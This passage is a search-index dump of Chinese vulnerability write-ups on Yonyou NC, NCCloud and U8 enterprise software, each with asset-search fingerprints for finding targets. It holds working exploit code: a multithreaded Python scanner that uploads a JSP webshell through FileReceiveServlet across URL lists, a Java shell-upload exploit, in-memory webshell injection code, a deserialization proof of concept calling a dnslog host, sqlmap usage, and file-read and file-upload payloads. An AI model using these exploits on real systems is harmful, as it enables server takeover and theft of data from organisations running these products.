","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/"},{"categories":null,"content":"用友 NC FileReceiveServlet 反序列化RCE漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友NC 6.5 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-UFIDA-NC\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 首先从任意文件上传说起 任意文件上传分析代码在servlet.FileReceiveServlet。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。 而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。 这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。 内存马 老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。 植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context Object obj = 改动Locator.getInstance().lookup(\"ServletContext\"); Field contextField = obj.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); obj = contextField.get(obj); Field contextField1 = obj.getClass().getDeclaredField(\"context\"); contextField1.setAccessible(true); addFitlertoTomcat(contextField1.get(obj)); 剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。 回显 我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中 不难看出 uploadServlet 就很满足这个需求。 out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); 如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。 所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r)); Exception e = (Exception) objectInputStream.readObject(); Object obj = e.getCause(); Field targetF = obj.getClass().getDeclaredField(\"target\"); targetF.setAccessible(true); obj = targetF.get(obj); Field msgF = obj.getClass().getSuperclass().getDeclaredField(\"detailMessage\"); msgF.setAccessible(true); String msg = msgF.get(obj).toString(); System.out.println(msg); ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"文件上传EXP python exp： import requests import threadpool import urllib3 import sys import argparse urllib3.disable_warnings() proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'} header = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://google.com\", } def multithreading(funcname, filename=\"url.txt\", pools=5): works = [] with open(filename, \"r\") as f: for i in f: func_params = [i.rstrip(\"\\n\")] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(funcname, works) [pool.putRequest(req) for req in reqs] pool.wait() def wirte_targets(vurl, filename): with open(filename, \"a+\") as f: f.write(vurl + \"\\n\") return vurl def exp(u): uploadHeader = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"multipart/form-data;\", \"Referer\": \"https://google.com\" } uploadData = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02\\x74\\x00\\x09\\x46\\x49\\x4c\\x45\\x5f\\x4e\\x41\\x4d\\x45\\x74\\x00\\x09\\x74\\x30\\x30\\x6c\\x73\\x2e\\x6a\\x73\\x70\\x74\\x00\\x10\\x54\\x41\\x52\\x47\\x45\\x54\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x50\\x41\\x54\\x48\\x74\\x00\\x10\\x2e\\x2f\\x77\\x65\\x62\\x61\\x70\\x70\\x73\\x2f\\x6e\\x63\\x5f\\x77\\x65\\x62\\x78\" shellFlag=\"t0test0ls\" uploadData+=shellFlag try: req1 = requests.post(u + \"/servlet/FileReceiveServlet\", headers=uploadHeader, verify=False, data=uploadData, timeout=25) if req1.status_code == 200 : req3=requests.get(u+\"/t00ls.jsp\",headers=header, verify=False, timeout=25) if req3.text.index(shellFlag)\u003e=0: printFlag = \"[Getshell]\" + u+\"/t00ls.jsp\" + \"\\n\" print (printFlag) wirte_targets(printFlag, \"vuln.txt\") except : pass #print(printFlag, end=\"\") if __name__ == \"__main__\": if (len(sys.argv)) \u003c 2: print('useage : python' +str(sys.argv[0]) + ' -h') else: parser =argparse.ArgumentParser() parser.description ='YONYOU UC 6.5 FILE UPLOAD!' parser.add_argument('-u',help=\"url -\u003e example http://127.0.0.1\",type=str,dest='check_url') parser.add_argument('-r',help=\"url list to file\",type=str,dest='check_file') args =parser.parse_args() if args.check_url: exp(args.check_url) if(args.check_file): multithreading(exp, args.check_file, 8) java exp： import java.io.*; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws Exception { String url=\"http://192.168.40.222\"; Map\u003cString, Object\u003e metaInfo=new HashMap\u003cString, Object\u003e(); metaInfo.put(\"TARGET_FILE_PATH\",\"webapps/nc_web\"); metaInfo.put(\"FILE_NAME\",\"cmd.jsp\"); ByteArrayOutputStream baos=new ByteArrayOutputStream(); ObjectOutputStream oos=new ObjectOutputStream(baos); oos.writeObject(metaInfo); InputStream in=App.class.getResourceAsStream(\"cmd.jsp\"); byte[] buf=new byte[1024]; int len=0; while ((len=in.read(buf))!=-1){ baos.write(buf,0,len); } HttpClient.post(url+\"/servlet/FileReceiveServlet\",baos.toByteArray()); HttpResult result=HttpClient.get(url+\"/cmd.jsp?cmd=echo+aaaaaa\"); if(result.getData().contains(\"aaaaaa\")){ System.out.println(\"shell路径:\"+url+\"/cmd.jsp?cmd=whoami\"); }else{ System.out.println(\"上传shell失败或者漏洞不存在\"); } } } ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:4:1","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-filereceiveservlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 NC NCFindWeb 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友NC存在任意文件读取漏洞，攻击者通过漏洞可读取服务器敏感文件 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友NC ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1085941792\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /NCFindWeb?service=IPreAlertConfigService\u0026filename=WEB-INF/web.xml ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-ncfindweb-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 NC XbrlPersistenceServlet反序列化 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":null,"content":"漏洞描述 用友 NC XbrlPersistenceServlet反序列化漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":null,"content":"漏洞影响 用友NC ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":null,"content":"漏洞复现 攻击队利用用友nc反序列利用 目前测试影响版本：nc6.5 漏洞url为： /service/~xbrl/XbrlPersistenceServlet poc： import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显 data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text) ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-xbrlpersistenceservlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":null,"content":"用友 NCCloud FS文件管理SQL注入 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞描述 用友 NCCloud FS文件管理登录页面对用户名参数没有过滤，存在SQL注入 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞影响 用友 NCCloud ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"网络测绘 \"NCCloud\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞描述 登录页面如下 在应用中存在文件服务器管理登录页面 http://xxx.xxx.xxx.xxx/fs/ 登录请求包如下 GET /fs/console?username=123\u0026password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: xxx.xxx.xxx.xxx Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server Connection: close 使用Sqlmap对username参数 进行SQL注入 sqlmap -r sql.txt -p username ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nccloud-fs%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"用友 U8 cloud upload.jsp 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 U8 cloud upload.jsp 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 U8 cloud ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"开启U8 cloud云端之旅\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /linux/pages/upload.jsp HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded filename: Test.jsp Accept-Encoding: gzip \u003c% out.println(\"Test\");%\u003e /linux/Test.jsp ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 U8 CRM客户关系管理系统 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"用友U8CRM\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ ------WebKitFormBoundarykS5RKgl8t3nwInMQ Content-Disposition: form-data; name=\"file\"; filename=\"test.php \" Content-Type: text/plain \u003c?php phpinfo();?\u003e ------WebKitFormBoundarykS5RKgl8t3nwInMQ 访问文件，文件名需要十六进制减一 /tmpfile/updD24D.tmp.php ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件 